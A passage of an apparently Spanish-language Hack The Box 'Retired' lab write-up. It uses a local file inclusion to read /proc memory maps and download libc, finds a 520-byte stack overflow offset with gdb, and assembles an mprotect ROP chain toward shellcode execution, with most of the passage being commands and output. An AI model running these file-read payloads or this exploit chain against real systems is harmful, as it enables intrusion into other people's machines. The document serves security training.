+<p class="plain-text">Ademas de ello el archivo <code class="language-plaintext highlighter-rouge">randomize_va_space</code> esta seteado a <code class="language-plaintext highlighter-rouge">2</code> lo que significa que el <code class="language-plaintext highlighter-rouge">ASLR</code> habilitado por lo que hay aleatorización en las direcciones de la memoria</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/proc/sys/kernel/randomize_va_space"</span><span class="p">  
+2</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciemos usando <code class="language-plaintext highlighter-rouge">php</code> en el directorio donde esta <code class="language-plaintext highlighter-rouge">activate_license.php</code> para asi poder redirigir el <code class="language-plaintext highlighter-rouge">licensefile</code> a la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> por el puerto <code class="language-plaintext highlighter-rouge">1337</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo php </span><span class="p">-S 0.0.0.0:80
+PHP 8.2.5 Development Server (http://0.0.0.0:80) started  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con gdb usando el argumento <code class="language-plaintext highlighter-rouge">1337</code> correremos el programa pero antes creamos un patron de <code class="language-plaintext highlighter-rouge">550</code> caracteres especialmente para encontrar el <code class="language-plaintext highlighter-rouge">offset</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb</span><span class="p"> -q --args ./activate_license 1337
+Reading symbols from </span><span class="ve">./activate_license</span><span class="p">...
+</span><span class="ro">gdb-peda$ </span><span class="p">pattern_create 550
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAso'  
+</span><span class="ro">gdb-peda$ </span><span class="p">run
+Starting program: </span><span class="ve">/home/kali/activate_license </span><span class="p">1337
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] starting server listening on port 1337
+[+] listening ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos usar <code class="language-plaintext highlighter-rouge">python</code> para definir como archivo <code class="language-plaintext highlighter-rouge">licensefile</code> el patron que hemos generado antes con <code class="language-plaintext highlighter-rouge">gdb</code>, lo enviamos al archivo <code class="language-plaintext highlighter-rouge">activate_license.php</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> import requests
+>>> payload = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAso"  
+>>> requests.post("http://localhost/activate_license.php", files={"licensefile": payload})
+&ltResponse [200]>
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer esto solo un <code class="language-plaintext highlighter-rouge">hilo</code> del programa que esta corriendo en gdb se corrompe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">gdb-peda$ </span><span class="p">run
+Starting program: </span><span class="ve">/home/kali/activate_license </span><span class="p">1337
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] starting server listening on port 1337
+[+] listening ...
+[+] accepted client connection from 0.0.0.0:0
+[Attaching after Thread 0x7ffff7b88740 (LWP 131738) fork to child process 131767]
+[New inferior 2 (process 131767)]
+[Detaching after fork from parent process 131738]
+[Inferior 1 (process 131738) detached]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[+] reading 550 bytes
+[+] activated license: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAso0  
+
+Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7ffff7b88740 (LWP 131767)]
+</span><span class="az">
+[----------------------------------registers-----------------------------------]
+</span><span class="ve">RAX</span><span class="p">: 0x23f 
+</span><span class="ve">RBX</span><span class="p">: </span><span class="az">0x7fffffffe008</span><span class="p"> --> </span><span class="az">0x7fffffffe35d</span><span class="p"> ("/home/kali/activate_license")
+</span><span class="ve">RCX</span><span class="p">: 0x0 
+</span><span class="ve">RDX</span><span class="p">: 0x0 
+</span><span class="ve">RSI</span><span class="p">: </span><span class="az">0x5555555592a0</span><span class="p"> ("[+] activated license: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAA"...)
+</span><span class="ve">RDI</span><span class="p">: </span><span class="az">0x7fffffffd6f0</span><span class="p"> --> </span><span class="ro">0x7ffff7cbbe70</span><span class="p"> (<__funlockfile>:	mov    rdi,QWORD PTR [rdi+0x88])
+</span><span class="ve">RBP</span><span class="p">: 0x4e73413873416973 ('siAs8AsN')
+</span><span class="ve">RSP</span><span class="p">: </span><span class="az">0x7fffffffde88</span><span class="p"> ("AsjAs9AsOAskAsPAslAsQAsmAsRAso0")
+</span><span class="ve">RIP</span><span class="p">: </span><span class="ro">0x5555555555c0</span><span class="p"> (&ltactivate_license+643>:	ret)
+</span><span class="ve">R8 </span><span class="p">: </span><span class="az">0x55555555949e</span><span class="p"> ("As5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAso0\n")
+</span><span class="ve">R9 </span><span class="p">: </span><span class="ro">0x7ffff7dd8500</span><span class="p"> (<__memcpy_ssse3+320>:	movaps xmm1,XMMWORD PTR [rsi+0x10])
+</span><span class="ve">R10</span><span class="p">: 0x0 
+</span><span class="ve">R11</span><span class="p">: 0x202 
+</span><span class="ve">R12</span><span class="p">: 0x0 
+</span><span class="ve">R13</span><span class="p">: </span><span class="az">0x7fffffffe020</span><span class="p"> --> </span><span class="az">0x7fffffffe386</span><span class="p"> ("SSH_AUTH_SOCK=/tmp/ssh-XXXXXXxIHA7L/agent.1442")
+</span><span class="ve">R14</span><span class="p">: 0x0 
+</span><span class="ve">R15</span><span class="p">: </span><span class="az">0x7ffff7ffd020</span><span class="p"> --> </span><span class="az">0x7ffff7ffe2e0</span><span class="p"> --> </span><span class="ve">0x555555554000</span><span class="p"> --> 0x10102464c457f
+</span><span class="ve">EFLAGS</span><span class="p">: 0x10206 (</span><span class="ve">carry </span><span class="ro">PARITY </span><span class="ve">adjust zero sign trap </span><span class="ro">INTERRUPT </span><span class="ve">direction overflow</span><span class="p">)
+</span><span class="az">[-------------------------------------code-------------------------------------]</span><span class="p">
+   0x5555555555b9 &ltactivate_license+636>:	</span><span class="ro">call   0x5555555550b0 &ltprintf@plt></span><span class="p">
+   0x5555555555be &ltactivate_license+641>:	</span><span class="c1">nop</span><span class="p">
+   0x5555555555bf &ltactivate_license+642>:	</span><span class="c1">leave</span><span class="p">
+=> 0x5555555555c0 &ltactivate_license+643>:	</span><span class="ve">ret</span><span class="p">
+   0x5555555555c1 &ltmain>:	push   rbp
+   0x5555555555c2 &ltmain+1>:	mov    rbp,rsp
+   0x5555555555c5 &ltmain+4>:	sub    rsp,0x60
+   0x5555555555c9 &ltmain+8>:	mov    DWORD PTR [rbp-0x54],edi
+</span><span class="az">[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="az">0x7fffffffde88</span><span class="p"> ("AsjAs9AsOAskAsPAslAsQAsmAsRAso0")
+0008| </span><span class="az">0x7fffffffde90</span><span class="p"> ("OAskAsPAslAsQAsmAsRAso0")
+0016| </span><span class="az">0x7fffffffde98</span><span class="p"> ("slAsQAsmAsRAso0")
+0024| </span><span class="az">0x7fffffffdea0</span><span class="p"> --> 0x306f7341527341 ('AsRAso0')
+0032| </span><span class="az">0x7fffffffdea8</span><span class="p"> --> 0x0 
+0040| </span><span class="az">0x7fffffffdeb0</span><span class="p"> --> 0x0 
+0048| </span><span class="az">0x7fffffffdeb8</span><span class="p"> --> 0x0 
+0056| </span><span class="az">0x7fffffffdec0</span><span class="p"> --> 0x0 
+</span><span class="az">[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="ro">code</span><span class="p">, </span><span class="az">data</span><span class="p">, </span><span class="ve">rodata</span><span class="p">, value
+Stopped reason: </span><span class="ro">SIGSEGV</span><span class="p">
+</span><span class="az">0x00005555555555c0 </span><span class="p">in </span><span class="am">activate_license</span><span class="p"> (</span><span class="az">sockfd</span><span class="p">=0x4) at </span><span class="ve">activate_license.c</span><span class="p">:64
+64	activate_license.c: No existe el fichero o el directorio.
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aqui podemos buscar mediante el patron la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios de basura antes de llegar a sobreescribir el registro <code class="language-plaintext highlighter-rouge">RIP</code>, estos son <code class="language-plaintext highlighter-rouge">520</code> en este caso especifico</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">gdb-peda$</span><span class="p"> x/wx $rsp
+</span><span class="az">0x7fffffffde88</span><span class="p">:	0x416a7341
+</span><span class="ro">gdb-peda$ </span><span class="p">pattern_offset 0x416a7341  
+1097495361 found at offset: 520
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciemos un pequeño <code class="language-plaintext highlighter-rouge">script</code> en python importando algunas librerias que utilizaremos y definiendo el <code class="language-plaintext highlighter-rouge">offset</code>, ademas el <code class="language-plaintext highlighter-rouge">junk</code> que son <code class="language-plaintext highlighter-rouge">A's</code> por el offset</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">p64
+</span><span class="o">import </span><span class="p">requests</span>
+
+</span><span class="p">offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La tecnica que utilzaremos será usar <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar los permisos de la <code class="language-plaintext highlighter-rouge">pila</code> y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code>, para despues poder ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en el <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">manual</a> de mprotect podemos ver que esta función recibe 3 <code class="language-plaintext highlighter-rouge">argumentos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="na">mprotect</span><span class="p">(</span><span class="no">void </span><span class="o">*</span><span class="am">addr</span><span class="p">, </span><span class="na">size_t </span><span class="am">len</span><span class="p">, </span><span class="no">int </span><span class="am">prot</span><span class="p">);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El primer argumento será la <code class="language-plaintext highlighter-rouge">direccion</code> donde queremos modificar los permisos que en este caso sera donde inicia el <code class="language-plaintext highlighter-rouge">stack</code>, el segundo sera la <code class="language-plaintext highlighter-rouge">longitud</code> que sera el tamaño del stack o pila y el ultimo son los <code class="language-plaintext highlighter-rouge">permisos</code> que sera <code class="language-plaintext highlighter-rouge">7</code> equivalente a <code class="language-plaintext highlighter-rouge">rwx</code></p>
+<a href="/htb/retired/4.png" target="_blank"><div><p><img src="/htb/retired/4.png"></p></div></a>
+
+<p class="plain-text">Tenemos el argumento 3, para obtener los primeros 2 podemos ver las <code class="language-plaintext highlighter-rouge">direcciones</code> de la ejecución en el pid <code class="language-plaintext highlighter-rouge">400</code> viendo el archivo <code class="language-plaintext highlighter-rouge">maps</code> que se muestran casi al final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://retired.htb/?page=/proc/400/maps"</span><span class="p">
+564086262000-564086263000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
+564086263000-564086264000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
+564086264000-564086265000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
+564086265000-564086266000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
+564086266000-564086267000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
+564086334000-564086355000 rw-p 00000000 00:00 0                          [heap]
+7f82a80e1000-7f82a80e3000 rw-p 00000000 00:00 0 
+7f82a80e3000-7f82a80e4000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f82a80e4000-7f82a80e6000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f82a80e6000-7f82a80e7000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f82a80e7000-7f82a80e8000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f82a80e8000-7f82a80e9000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7f82a80e9000-7f82a80f0000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f82a80f0000-7f82a8100000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f82a8100000-7f82a8105000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f82a8105000-7f82a8106000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f82a8106000-7f82a8107000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7f82a8107000-7f82a810b000 rw-p 00000000 00:00 0 
+7f82a810b000-7f82a811a000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f82a811a000-7f82a81b4000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f82a81b4000-7f82a824d000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f82a824d000-7f82a824e000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f82a824e000-7f82a824f000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7f82a824f000-7f82a8274000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f82a8274000-7f82a83bf000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f82a83bf000-7f82a8409000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f82a8409000-7f82a840a000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f82a840a000-7f82a840d000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f82a840d000-7f82a8410000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7f82a8410000-7f82a8414000 rw-p 00000000 00:00 0 
+7f82a8414000-7f82a8424000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7f82a8424000-7f82a851c000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7f82a851c000-7f82a8550000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7f82a8550000-7f82a8554000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7f82a8554000-7f82a8557000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
+7f82a8557000-7f82a8559000 rw-p 00000000 00:00 0 
+7f82a855e000-7f82a855f000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f82a855f000-7f82a857f000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f82a857f000-7f82a8587000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f82a8588000-7f82a8589000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f82a8589000-7f82a858a000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+7f82a858a000-7f82a858b000 rw-p 00000000 00:00 0 
+7ffd16c4c000-7ffd16c6d000 rw-p 00000000 00:00 0                          [stack]
+7ffd16d8e000-7ffd16d92000 r--p 00000000 00:00 0                          [vvar]
+7ffd16d92000-7ffd16d94000 r-xp 00000000 00:00 0                          [vdso]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">maps</code> podemos ver las <code class="language-plaintext highlighter-rouge">direcciones</code> desde donde inicia hasta donde termina el <code class="language-plaintext highlighter-rouge">stack</code>, con ello obtenemos el primer argumento, para el segundo que es el <code class="language-plaintext highlighter-rouge">tamaño</code> podemos calculardo restandole la direccion de inicio a la de final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">stack_start </span><span class="o">= </span><span class="mi">0x7ffd16c4c000
+</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffd16c6d000
+</span><span class="p">stack_size</span><span class="o"> = </span><span class="p">stack_end </span><span class="o">- </span><span class="p">stack_start</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Además en el archivo <code class="language-plaintext highlighter-rouge">maps</code> podemos tomar la dirección donde inicia <code class="language-plaintext highlighter-rouge">libc</code> en el proceso para tomarlo como <code class="language-plaintext highlighter-rouge">libc_base</code> para algunas operaciones mas adelante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">libc_base</span><span class="o"> = </span><span class="mi">0x7f82a824f000</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para poder obtener algunas funciones descargaremos el archivo <code class="language-plaintext highlighter-rouge">libc</code> de la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://retired.htb/?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="p"> -o libc-2.31.so  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">readelf</code> podemos obtener un <code class="language-plaintext highlighter-rouge">offset</code> de la función <code class="language-plaintext highlighter-rouge">mprotect</code> que al sumarlo con la dirección de <code class="language-plaintext highlighter-rouge">libc_base</code> nos daria como resultado la <code class="language-plaintext highlighter-rouge">dirección</code> de la función</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ readelf </span><span class="p">-s libc-2.31.so | </span><span class="ve">grep </span><span class="p">mprotect@@
+  1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 </span><span class="ro">mprotect@@</span><span class="p">GLIBC_2.2.5  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregaremos al script de python el <code class="language-plaintext highlighter-rouge">offset</code> de la función mprotect como un entero</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">offset_mprotect </span><span class="o">= </span><span class="mi">0x00000000000f8c20</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos los 3 argumentos para <code class="language-plaintext highlighter-rouge">mprotect</code> pero para que la función los tome es necesario tener el control de los registros <code class="language-plaintext highlighter-rouge">RDI</code>, <code class="language-plaintext highlighter-rouge">RSI</code> y <code class="language-plaintext highlighter-rouge">RDX</code> para poder enviarlos ahi y llamarla, para ello con <code class="language-plaintext highlighter-rouge">ropper</code> buscaremos <code class="language-plaintext highlighter-rouge">gadgets</code> que hagan un pop a ellos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rdi; ret;"</span><span class="p">  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
+</span><span class="ro">0x0000000000026796</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"> 
+
+</span><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rsi; ret;"</span><span class="p">  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rsi; ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
+</span><span class="ro">0x000000000002890f</span><span class="p">: </span><span class="am">pop </span><span class="p">rsi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"> 
+
+</span><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"pop rdx; ret;"</span><span class="p">  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdx; ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
+</span><span class="ro">0x00000000000cb1cd</span><span class="p">: </span><span class="am">pop </span><span class="p">rdx</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p"></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregaremos estos 3 <code class="language-plaintext highlighter-rouge">offsets</code> de gadgets para tener el control de los registros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">offset_pop_rdi </span><span class="o">= </span><span class="mi">0x0000000000026796
+</span><span class="p">offset_pop_rsi </span><span class="o">= </span><span class="mi">0x000000000002890f</span><span class="p">
+</span><span class="p">offset_pop_rdx </span><span class="o">= </span><span class="mi">0x00000000000cb1cd</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La idea ahora seria despues de llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> hacer un salto al registro <code class="language-plaintext highlighter-rouge">RSP</code> que es la pila y ahora que esta es ejecutable ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
+<a href="/htb/retired/5.png" target="_blank"><div><p><img src="/htb/retired/5.png"></p></div></a>
+
+<p class="plain-text">El problema viene que en la libreria de <code class="language-plaintext highlighter-rouge">libc</code> no hay ningun gadget para <code class="language-plaintext highlighter-rouge">jmp rsp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"jmp rsp;"</span><span class="p">  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: jmp rsp;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo hay algunas alternativas como <code class="language-plaintext highlighter-rouge">call rsp</code> o simplemente un <code class="language-plaintext highlighter-rouge">push rsp</code> que hace algo similar y nos servira en este caso para poder enviarnos a la <code class="language-plaintext highlighter-rouge">pila</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file libc-2.31.so --search </span><span class="am">"push rsp; ret;"</span><span class="p">  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: push rsp; ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: libc-2.31.so
+</span><span class="ro">0x000000000003afc9</span><span class="p">: </span><span class="am">push </span><span class="p">rsp</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">También definimos este <code class="language-plaintext highlighter-rouge">offset</code> en el script de python junto con los demas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">offset_push_rsp </span><span class="o">= </span><span class="mi">0x000000000003afc9</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora a cada uno de los <code class="language-plaintext highlighter-rouge">offsets</code> les sumaremos la dirección de <code class="language-plaintext highlighter-rouge">libc_base</code> para asi obtener las <code class="language-plaintext highlighter-rouge">direcciones</code> finales de cada uno, ademas usamos <code class="language-plaintext highlighter-rouge">p64</code> para el formato</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mprotect </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_mprotect)
+pop_rdi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdi)
+pop_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rsi)
+pop_rdx </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdx)
+push_rsp </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_push_rsp)</span>
+</code></pre></div></div><br>
+
